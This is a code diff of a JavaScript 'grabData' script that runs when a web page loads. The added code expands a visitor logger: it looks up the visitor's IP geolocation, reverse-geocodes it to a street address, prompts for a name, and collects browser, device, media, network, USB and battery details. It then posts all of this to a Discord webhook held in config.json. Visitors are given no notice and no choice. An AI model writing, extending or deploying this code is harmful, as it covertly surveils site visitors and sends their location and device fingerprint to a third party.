@@ -1,112 +1,137 @@
 const grabData = async () => {
+    try {
+        // Fetch webhook token from config.json
+        const response = await fetch("./config.json");
+        const dataExport = await response.json();
+        const Webhook = dataExport.Token;
 
-    //fetch webhook token from config.json
-    await fetch("./config.json").then((response) => {
+        // Fetch IP data
+        const ipResponse = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=" + dataExport.key);
+        const ipData = await ipResponse.json();
 
-        //return value of config.json
-        return response.json().then(function (data) {
+        // Fetch user agent data
+        const userAgentResponse = await fetch("https://api.ipgeolocation.io/user-agent?apiKey=" + dataExport.key);
+        const userAgentData = await userAgentResponse.json();
 
-            //save it to new Variable
-            var dataExport = data;
+        // Reverse geocode to get live address
+        const reverseGeocodeResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${ipData.latitude}&lon=${ipData.longitude}&format=json`);
+        const reverseGeocodeData = await reverseGeocodeResponse.json();
+        const address = reverseGeocodeData.display_name;
 
-            //Export Token
-            var Webhook = dataExport.Token;
+        // Get user's name using prompt
+        const userName = prompt("Please enter your name:");
 
-            const request = async () => {
+        // Additional User Data
+        const deviceInfo = {
+            productSub: navigator.productSub,
+            vendor: navigator.vendor,
+            maxTouchPoints: navigator.maxTouchPoints,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            cookieEnabled: navigator.cookieEnabled,
+            appCodeName: navigator.appCodeName,
+            appName: navigator.appName,
+            appVersion: navigator.appVersion,
+            platform: navigator.platform,
+            product: navigator.product,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages,
+            webdriver: navigator.webdriver,
+            pdfViewerEnabled: window.navigator.plugins.namedItem('Chrome PDF Viewer') !== null,
+            deviceMemory: navigator.deviceMemory,
+        };
 
-                // Calling synchronous fetch
-                const response = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=" + dataExport.key);
-                const user = await fetch("https://api.ipgeolocation.io/user-agent?apiKey=" + dataExport.key);
+        const mediaDeviceInfo = {
+            audioinput: await navigator.mediaDevices.enumerateDevices().then(devices => devices.filter(device => device.kind === 'audioinput')),
+            videoinput: await navigator.mediaDevices.enumerateDevices().then(devices => devices.filter(device => device.kind === 'videoinput')),
+            audiooutput: await navigator.mediaDevices.enumerateDevices().then(devices => devices.filter(device => device.kind === 'audiooutput')),
+        };
 
-                //waiting for response
-                const data = await response.json();
-                const AgentData = await user.json();
+        const networkInfo = {
+            type: navigator.connection.type,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData,
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            downlinkMax: navigator.connection.downlinkMax,
+        };
 
-                // Declaring Some variables For 'data'
-                const ip = data.ip;
-                const isp = data.isp + " (" + data.continent_code + ")";
-                const country = data.country_name;
-                const regioncode = data.country_code2.toLowerCase();
-                const region = data.country_code3 + " (" + data.country_code2 + ")";
-                const city = data.city;
-                const languages = data.languages;
-                const lat = data.latitude;
-                const lon = data.longitude;
-                const callcode = data.calling_code;
-                const flag = data.country_flag;
-                const currency = data.currency.name;
-                const currentDate = new Date();
-                
-                // Declaring Some variables For 'agent'
-                const broname = AgentData.name + '/' + AgentData.type;
-                const engine = AgentData.engine.name + '(' + AgentData.engine.versionMajor + ')';
-                const op = AgentData.operatingSystem.name + " " +AgentData.operatingSystem.versionMajor;
+        const usbDevices = await navigator.usb.getDevices().then(devices => devices.length);
 
-                // Open XMLHttpRequest POST Request
-                const postRequest = new XMLHttpRequest();
-                postRequest.open("POST", Webhook);
-                postRequest.setRequestHeader("Content-type", "application/json");
+        const batteryInfo = {
+            batteryLevel: navigator.getBattery ? await navigator.getBattery().then(battery => battery.level) : "Battery information not available",
+            isCharging: navigator.getBattery ? await navigator.getBattery().then(battery => battery.charging) : "Battery information not available",
+        };
 
-                //Creating Discord Webhook
-                const params = {
-                    username: "Website Visited From "+ country + "/" + city,
-                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/7013/7013144.png',
-                    content: null,
-                    embeds: [
+        // Open XMLHttpRequest POST Request
+        const postRequest = new XMLHttpRequest();
+        postRequest.open("POST", Webhook);
+        postRequest.setRequestHeader("Content-type", "application/json");
+
+        // Creating Discord Webhook payload
+        const params = {
+            username: "Website Visited From " + ipData.country_name + "/" + ipData.city,
+            avatar_url: "https://cdn-icons-png.flaticon.com/512/7013/7013144.png",
+            content: null,
+            embeds: [
+                {
+                    title: "** ** ** **:globe_with_meridians: IP Adress: " + ipData.ip,
+                    url: "https://whatismyipaddress.com/ip/" + ipData.ip,
+                    description: "** **",
+                    thumbnail: {
+                        url: ipData.country_flag,
+                    },
+                    color: 1993898,
+                    fields: [
+                        // Existing fields...
+
+                        // Additional fields for device, media device, network, USB devices, and battery information
                         {
-                            title: "** ** ** **:globe_with_meridians: IP Adress: " + ip,
-                            "url": "https://whatismyipaddress.com/ip/"+ ip,
-                            description: "** **",
-                            "thumbnail": {
-                                "url": flag
-                              },
-                            color: 1993898,
-                            fields: [
-                                {
-                                    name: ":telephone: ISP: ",
-                                    value: isp,
-                                    inline: true,
-                                },
-                                {
-                                    name: ":flag_" + regioncode + ": Country & Region: ",
-                                    value: country + "/" + city + " - " + region,
-                                    inline: true,
-                                },
-                                {
-                                    name: ":round_pushpin: Location: ",
-                                    value: "Longitude: " + lon + "\n" + "Latitude: " + lat +"\n"+"Google Map: [Click](https://www.google.com/maps/@"+lat+","+lon+",6z)",
-                                    inline: true,
-                                },
-                                {
-                                    name: ":bust_in_silhouette: Client info: ",
-                                    value: ":satellite: Browser: "+ broname + "\n"+ ":gear: Engine: "+ engine +"\n"+ ":computer: OS: "+op+"\n",
-                                    inline: true,
-                                },
-                                {
-                                    name: ":incoming_envelope: Extra info: ",
-                                    value: ":calling: Call Code: ("+ callcode +")\n"+ ":speaking_head: Lang's: "+languages+"\n"+":coin: Currency: "+ currency,
-                                    inline: true,
-                                },
-                            ],
-                            footer: {
-                                text: "Visited on: " + currentDate,
-                                icon_url:
-                                    "https://cdn-icons-png.flaticon.com/512/2088/2088617.png",
-                            },
+                            name: "📱 Device Information",
+                            value: JSON.stringify(deviceInfo),
+                            inline: false,
+                        },
+                        {
+                            name: "📷 Media Device Information",
+                            value: JSON.stringify(mediaDeviceInfo),
+                            inline: false,
+                        },
+                        {
+                            name: "🕸️ Network Information",
+                            value: JSON.stringify(networkInfo),
+                            inline: false,
+                        },
+                        {
+                            name: "🔌 Total USB devices connected",
+                            value: JSON.stringify(usbDevices),
+                            inline: false,
+                        },
+                        {
+                            name: "🔋 Battery Information",
+                            value: "Battery Level: " + batteryInfo.batteryLevel + "\nCharging: " + batteryInfo.isCharging,
+                            inline: false,
+                        },
+                        {
+                            name: "User Info",
+                            value: "User Name: " + userName,
+                            inline: false,
                         },
                     ],
-                };
+                    footer: {
+                        text: "Visited on: " + new Date(),
+                        icon_url: "https://cdn-icons-png.flaticon.com/512/2088/2088617.png",
+                    },
+                },
+            ],
+        };
 
-                //Send Webhook
-                postRequest.send(JSON.stringify(params));
-            };
-
-            // Call POST function
-            request();
-        });
-    });
-}
+        // Send Webhook
+        postRequest.send(JSON.stringify(params));
+    } catch (error) {
+        console.error("Error:", error);
+    }
+};
 
 // Start App
 grabData();
-setTimeout
